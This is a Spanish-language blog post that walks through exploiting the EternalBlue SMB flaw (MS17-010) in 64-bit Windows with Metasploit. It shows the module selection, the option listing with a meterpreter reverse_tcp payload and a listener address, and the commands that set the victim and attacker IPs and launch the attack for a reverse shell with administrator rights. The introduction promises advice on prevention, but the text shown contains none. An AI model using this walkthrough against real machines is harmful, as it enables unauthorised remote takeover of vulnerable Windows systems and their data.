---
title: Eternalblue
published: true
---

* Confidencialidad: Totalmente comprometida.
* Integridad: Totalmente comprometida.
* Disponibilidad: Totalmente comprometida.
* Ataque: A traves de la red (Puerto 445).

Buenas a todos, hoy vengo a compartir el uso de un exploit que nos permitira comprometer máquinas Windows de 64 bits, ademas de ello, aprenderemos a como evitar ser comprometidas por este exploit.

## ¿En que consiste eternalblue?

Eternalblue es un exploit que nos permite vulnerar máquinas Windows Vista SP2, Windows Server 2008 SP2 y R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold y R2, Windows RT 8.1, Windows 10 Gold 1511 y 1607, y Windows Server 2016 de 64 bits aprovechando una vulnerabilidad en el SMB (Server Message Block). Lo interesante de este exploit, es que no nos hará falta hacer una escalación de privilegios previa, debido a que desde el primer momento ya seremos administradores de la máquina, comprometiéndola por completo. Y todo esto a través de la red (Puerto 445).

## ¿Como atacar usando este exploit?
Para usar este exploit, usaremos [Metasploit Framework](https://www.metasploit.com/).

* Primero, seleccionaremos el exploit:

```
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.1.13-dev-                         ]
+ -- --=[ 2176 exploits - 1153 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
* Una vez seleccionado el exploit podremos hacer un "show options" para ver los parámetros que debemos configurar:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.158    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

* Ahora que sabemos que parámetros nos permite configurar el exploit, cambiaremos los necesarios. Primero, tendremos que saber la IP de la máquina víctima. La configuraremos con "set RHOST [IP de la victima]".

* Después, comprobaremos si nuestra IP esta correctamente seleccionada, en caso contrario, usaremos "set LHOST [Nuestra IP]".

Eso sería todo, con esos parámetros básicos, ya seriamos capaces de ejecutar el exploit y comprometer la máquina. Para ejecutar el exploit usaremos el comando "run". 

Una vez que la máquina haya sido comprometida, se nos abrirá una shell reversa usando meterpreter (Esta definido por defecto como payload).
